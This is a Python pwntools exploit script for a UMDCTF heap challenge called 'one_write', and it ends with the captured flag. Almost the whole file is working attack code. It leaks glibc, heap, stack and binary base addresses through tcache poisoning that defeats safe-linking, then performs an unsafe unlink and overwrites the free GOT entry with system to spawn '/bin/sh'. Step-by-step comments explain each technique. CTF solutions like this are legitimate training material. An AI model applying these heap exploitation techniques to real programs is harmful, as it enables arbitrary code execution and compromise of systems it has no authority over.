from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./one_write_patched', '''
    b *alloc_chunk
    b *free_chunk
    b *write_chunk
    b *read_chunk
    continue
''')

# p = remote('challs.umdctf.io', 31727)

def alloc_chunk(idx, size):
    p.sendlineafter(b"> ", b'1')
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendlineafter(b"size: ", str(size).encode())

def free_chunk(idx):
    p.sendlineafter(b"> ", b'2')
    p.sendlineafter(b"idx: ", str(idx).encode())

def write_chunk(data):
    # there is only one write of size 0x5f8 max to global variable *the_chunk=heap_base_addr+0x2a0
    p.sendlineafter(b"> ", b'3')
    p.sendafter(b"data: ", data)

def read_chunk():
    # there is only one read of size 0x5f8 from global variable *the_chunk=heap_base_addr+0x2a0
    p.sendlineafter(b"> ", b'4')
    return p.recv(0x5f8)

# in this challenge, read from and write to anywhere outside of heap area is unavailable

glibc_e = ELF('./libc.so.6')

# Stage 1: leak glibc base address and heap base address
alloc_chunk(0, 0x418)
alloc_chunk(1, 0x18)
free_chunk(0)
free_chunk(1)
leaks1 = read_chunk()
glibc_base_addr = (u64(leaks1[0:8])&~0xfff)-0x203000
log.info(f"glibc base address: {hex(glibc_base_addr)}")
heap_base_addr = ((u64(leaks1[0x420:0x428])<<12)^0)&~0xfff
log.info(f"heap base address: {hex(heap_base_addr)}")

# Stage 2: leak stack argv address using tcache poisoning
# this leak technique is based on a free just after tcache poisoning and takes place in post tcache poisoning stage
# it can typically copy a qword (in a "double-safe-linking-encrypted" form) in any specified address (16-byte aligned) into heap area
alloc_chunk(2, 0x28)
alloc_chunk(3, 0x28)
alloc_chunk(4, 0x28)
free_chunk(3)
free_chunk(2)
# tcache bins with size 0x30: heap_base_addr+0x2a0 <- glibc_base_addr+glibc_e.symbols['__libc_argv'] <- [*(glibc_base_addr+glibc_e.symbols['__libc_argv'])]^((glibc_base_addr+glibc_e.symbols['__libc_argv'])>>12)
write_chunk(p64((glibc_base_addr+glibc_e.symbols['__libc_argv'])^((heap_base_addr+0x2a0)>>12)))
alloc_chunk(5, 0x28)
alloc_chunk(6, 0x28)
# tcache bins with size 0x30: heap_base_addr+0x300 <- [*(glibc_base_addr+glibc_e.symbols['__libc_argv'])]^((glibc_base_addr+glibc_e.symbols['__libc_argv'])>>12)
free_chunk(4)
leaks2 = read_chunk()
stack_argv_addr = u64(leaks2[0x60:0x68])^((heap_base_addr+0x300)>>12)^((glibc_base_addr+glibc_e.symbols['__libc_argv'])>>12)
log.info(f"stack argv address: {hex(stack_argv_addr)}")

# Stage 3: leak elf base address using tcache poisoning
# this leak technique is based on a free just after tcache poisoning and takes place in post tcache poisoning stage
# it can typically copy a qword (in a "double-safe-linking-encrypted" form) in any specified address (16-byte aligned) into heap area
alloc_chunk(7, 0x38)
alloc_chunk(8, 0x38)
alloc_chunk(9, 0x38)
free_chunk(8)
free_chunk(7)
# tcache bins with size 0x40: heap_base_addr+0x330 <- stack_argv_addr-0x48 <- [*(stack_argv_addr-0x48)]^((stack_argv_addr-0x48)>>12)
write_chunk(b'\0'*0x88+p64(41)+p64((stack_argv_addr-0x48)^((heap_base_addr+0x330)>>12)))
alloc_chunk(10, 0x38)
alloc_chunk(11, 0x38)
# tcache bins with size 0x40: heap_base_addr+0x3b0 <- [*(stack_argv_addr-0x48)]^((stack_argv_addr-0x48)>>12)
free_chunk(9)
leaks3 = read_chunk()
elf_base_addr = (u64(leaks3[0x110:0x118])^((heap_base_addr+0x3b0)>>12)^((stack_argv_addr-0x48)>>12))-0x10b0
log.info(f"elf base address: {hex(elf_base_addr)}")

# Stage 4: unsafe unlink to arbitrary write on elf to pop a shell
# unsafe-unlink method is always used when there is a global variable in bss section storing a heap address
# this technique can be used to change a global variable's value to its address minus 0x18, which is very useful in a heap challenge with limited write
# clear unsorted bin
alloc_chunk(12, 0x2c8)
# chunk at heap_base_addr+0x6e0 that will be freed to perform unsafe unlink
alloc_chunk(13, 0x418)
# avoid malloc consolidation
alloc_chunk(14, 0x48)
# prepare fake chunk of size 0x431 at heap_base_addr+0x2b0 for unsafe unlink within chunk at heap_base_addr+0x2a0
# elf_base_addr+0x4080-0x18 (&the_chunk-0x18) is fd pointer of fake chunk, which satisfies the condition: fake chunk->fd->bk == fake chunk
# elf_base_addr+0x4080-0x10 (&the_chunk-0x10) is bk pointer of fake chunk, which satisfies the condition: fake chunk->bk->fd == fake chunk
# overwrite prev_size with 0x430 (fake chunk size) and size with 0x420 (set prev_inuse to 0) of chunk at heap_base_addr+0x6e0 to pass check of unsafe unlink
write_chunk(p64(0)+p64(0x431)+p64(elf_base_addr+0x4080-0x18)+p64(elf_base_addr+0x4080-0x10)+b'\0'*0x410+p64(0x430)+p64(0x420))
# free chunk at heap_base_addr+0x6e0 to perform unsafe unlink
free_chunk(13)
# value in the_chunk is the_chunk-0x18 now
# make value in the_chunk be address of free GOT table entry
# make value in chunks[0] be address of "/bin/sh\x00" string
write_chunk(p64(0)*3 + p64(elf_base_addr+0x4000)+p64(0)*3+p64(elf_base_addr+0x4080+0x28)+b'/bin/sh\x00')
# overwrite value in free GOT table entry to glibc system address
write_chunk(p64(glibc_base_addr + glibc_e.sym.system))
# free chunk at chunks[0] to trigger system("/bin/sh\x00") to pop a shell
free_chunk(0)

p.interactive()

# UMDCTF{but_look_at_this_its_j0hn_p0rk}